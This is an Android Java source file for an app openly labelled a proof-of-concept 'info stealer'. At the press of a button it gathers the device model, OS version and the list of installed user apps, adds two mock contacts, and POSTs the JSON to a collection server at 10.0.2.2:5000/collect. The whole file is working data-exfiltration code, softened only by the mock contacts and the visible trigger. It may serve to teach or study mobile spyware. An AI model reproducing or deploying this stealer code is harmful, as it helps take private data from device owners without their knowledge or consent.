// MainActivity.java
package com.example.infostealerpoc;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private Button sendDataButton;
    private TextView statusText;
    // The URL for our Flask server's endpoint
    private static final String SERVER_URL = "http://10.0.2.2:5000/collect";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main); // Your activity_main.xml can stay the same

        sendDataButton = findViewById(R.id.sendDataButton);
        statusText = findViewById(R.id.statusText);
        setTitle("PoC Info Stealer (HTTP)");

        sendDataButton.setOnClickListener(v -> {
            statusText.setText("Status: Collecting and sending data...");
            new Thread(this::collectAndSendData).start();
        });
    }

    private void collectAndSendData() {
        HttpURLConnection conn = null;
        try {
            // 1. Collect all the data into a JSON object
            JSONObject data = new JSONObject();
            data.put("deviceModel", Build.MODEL);
            data.put("osVersion", Build.VERSION.RELEASE);
            data.put("sdkVersion", Build.VERSION.SDK_INT);

            PackageManager pm = getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            JSONArray appList = new JSONArray();
            for (ApplicationInfo packageInfo : packages) {
                if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    appList.put(packageInfo.packageName);
                }
            }
            data.put("installedApps", appList);

            JSONArray mockContacts = new JSONArray();
            mockContacts.put(new JSONObject().put("name", "Alice Mock").put("phone", "555-0101"));
            mockContacts.put(new JSONObject().put("name", "Bob Test").put("phone", "555-0102"));
            data.put("mockContacts", mockContacts);

            // 2. Set up the HTTP connection
            URL url = new URL(SERVER_URL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; utf-8");
            conn.setRequestProperty("Accept", "application/json");
            conn.setDoOutput(true); // We are sending data (a request body)

            // 3. Write the JSON data to the connection's output stream
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = data.toString(4).getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            // 4. Check the server's response code
            int responseCode = conn.getResponseCode();
            Log.i("InfoStealerPoC", "HTTP Response Code: " + responseCode);

            if (responseCode == HttpURLConnection.HTTP_OK) {
                runOnUiThread(() -> statusText.setText("Status: Data sent successfully!"));
            } else {
                runOnUiThread(() -> statusText.setText("Status: Server returned error: " + responseCode));
            }

        } catch (Exception e) {
            Log.e("InfoStealerPoC", "Error sending data", e);
            runOnUiThread(() -> statusText.setText("Status: Failed to send data. Error: " + e.getMessage()));
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }
}
